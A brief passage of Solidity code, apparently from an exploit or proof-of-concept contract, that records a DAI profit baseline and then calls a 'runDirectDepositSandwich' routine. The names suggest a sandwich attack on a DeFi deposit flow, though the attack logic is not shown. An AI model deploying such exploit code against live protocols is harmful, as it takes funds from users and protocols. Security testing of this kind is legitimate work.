            return;
        }

        baselineProfitBalance = IERC20Like(DAI).balanceOf(address(this));

        uint256 verifierHeldDai = IERC20Like(DAI).balanceOf(address(this));
        if (verifierHeldDai > 0) {
            try this.runDirectDepositSandwich(verifierHeldDai) {
